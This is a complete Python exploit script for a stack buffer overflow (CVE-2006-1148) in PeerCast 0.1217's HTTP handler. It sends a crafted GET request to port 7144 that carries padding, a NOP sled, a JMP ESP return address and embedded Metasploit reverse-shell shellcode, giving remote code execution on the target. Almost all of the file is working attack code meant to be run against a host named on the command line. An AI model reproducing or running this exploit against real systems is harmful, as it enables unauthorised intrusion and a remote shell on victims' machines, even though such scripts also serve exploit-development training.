#!/usr/bin/python
# PeerCast 0.1217 HTTP GET BOF.
# Exploit Converted from Perl to Python
# https://cve.circl.lu/cve/CVE-2006-1148
# Ported/Modified by James Hemmings
import time, struct, sys
import socket as so

try:
    server = sys.argv[1]
    port = 7144
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()
# Bad Char Payload    
#payload = ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B")
# 768 offset
# MSF Reverse Payload - Bad Chars ()
buf =  ""
buf += "\xbe\x98\xa7\x04\xf4\xdb\xcb\xd9\x74\x24\xf4\x5a\x2b"
buf += "\xc9\xb1\x54\x31\x72\x13\x03\x72\x13\x83\xc2\x9c\x45"
buf += "\xf1\x08\x74\x0b\xfa\xf0\x84\x6c\x72\x15\xb5\xac\xe0"
buf += "\x5d\xe5\x1c\x62\x33\x09\xd6\x26\xa0\x9a\x9a\xee\xc7"
buf += "\x2b\x10\xc9\xe6\xac\x09\x29\x68\x2e\x50\x7e\x4a\x0f"
buf += "\x9b\x73\x8b\x48\xc6\x7e\xd9\x01\x8c\x2d\xce\x26\xd8"
buf += "\xed\x65\x74\xcc\x75\x99\xcc\xef\x54\x0c\x47\xb6\x76"
buf += "\xae\x84\xc2\x3e\xa8\xc9\xef\x89\x43\x39\x9b\x0b\x82"
buf += "\x70\x64\xa7\xeb\xbd\x97\xb9\x2c\x79\x48\xcc\x44\x7a"
buf += "\xf5\xd7\x92\x01\x21\x5d\x01\xa1\xa2\xc5\xed\x50\x66"
buf += "\x93\x66\x5e\xc3\xd7\x21\x42\xd2\x34\x5a\x7e\x5f\xbb"
buf += "\x8d\xf7\x1b\x98\x09\x5c\xff\x81\x08\x38\xae\xbe\x4b"
buf += "\xe3\x0f\x1b\x07\x09\x5b\x16\x4a\x45\xa8\x1b\x75\x95"
buf += "\xa6\x2c\x06\xa7\x69\x87\x80\x8b\xe2\x01\x56\xec\xd8"
buf += "\xf6\xc8\x13\xe3\x06\xc0\xd7\xb7\x56\x7a\xfe\xb7\x3c"
buf += "\x7a\xff\x6d\xa8\x7f\x97\x4d\x85\xca\xe2\x26\xd4\xca"
buf += "\xfc\x41\x51\x2c\xac\xfd\x32\xe1\x0c\xae\xf2\x51\xe4"
buf += "\xa4\xfc\x8e\x14\xc7\xd6\xa6\xbe\x28\x8f\x9f\x56\xd0"
buf += "\x8a\x54\xc7\x1d\x01\x11\xc7\x96\xa0\xe5\x89\x5e\xc0"
buf += "\xf5\xfd\x3e\x2a\x06\xfd\xaa\x2a\x6c\xf9\x7c\x7c\x18"
buf += "\x03\x58\x4a\x87\xfc\x8f\xc8\xc0\x02\x4e\xf9\xbb\x34"
buf += "\xc4\x45\xd4\x38\x08\x46\x24\x6e\x42\x46\x4c\xd6\x36"
buf += "\x15\x69\x19\xe3\x09\x22\x8f\x0c\x78\x96\x18\x65\x86"
buf += "\xc1\x6e\x2a\x79\x24\xed\x2d\x85\xba\xd3\x95\xee\x44"
buf += "\x53\x26\xef\x2e\x53\x76\x87\xa5\x7c\x79\x67\x45\x57"
buf += "\xd2\xef\xcc\x39\x90\x8e\xd1\x10\x74\x0f\xd1\x96\xad"
buf += "\x46\x5c\x59\x52\x67\x9e\x66\x84\x5e\xd4\xaf\x14\xe5"
buf += "\xe7\x9a\x39\x4c\x62\xe4\x6e\x8e\xa7"
# JMP ESP - USER32 0x7E429353
eip = "\x53\x93\x42\x7e"
junk = "A" * 256
nops = "\x90" * (768 - len(buf)-256)                                           # Stack Ajustment 127
req1 = "GET /stream/?" + junk + nops + buf + eip + "\x90" * 10 + "\x83\xec\x7f" + "\x83\xec\x7f" + "\x83\xec\x7f" + "\x83\xec\x6f" + "\xff\xe4" + " HTTP/1.0\n\n"
s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
     s.connect((server, port))
     #print repr(s.recv(1024))
     s.send(req1)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger"
s.close()
